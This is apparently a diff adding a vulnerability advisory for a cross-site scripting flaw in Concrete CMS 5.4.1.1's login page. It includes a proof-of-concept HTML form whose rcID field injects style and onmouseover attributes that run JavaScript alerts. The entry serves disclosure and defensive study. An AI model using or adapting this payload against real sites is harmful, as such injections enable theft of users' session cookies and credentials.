@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/49276/info
+
+Concrete is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Concrete 5.4.1.1 is vulnerable; other versions may also be affected. 
+
+<form action="http://www.example.com/Concrete/index.php/login/do_login/"  method="post">
+<input type="hidden" name="uName" value="test" />
+<input type="hidden" name="uPassword" value="test" />
+<input type="hidden" name="rcID" value=&#039;" style=display:block;color:red;width:9999;height:9999;z-index:9999;top:0;left:0;background-image:url(javascript:alert(/XSS/));width:expression(alert(/XSS/)); onmouseover="alert(/XSS/)&#039; />
+<input type="submit" name="submit" value="Get Concrete CMS 5.4.1.1 XSS" />
+</form>
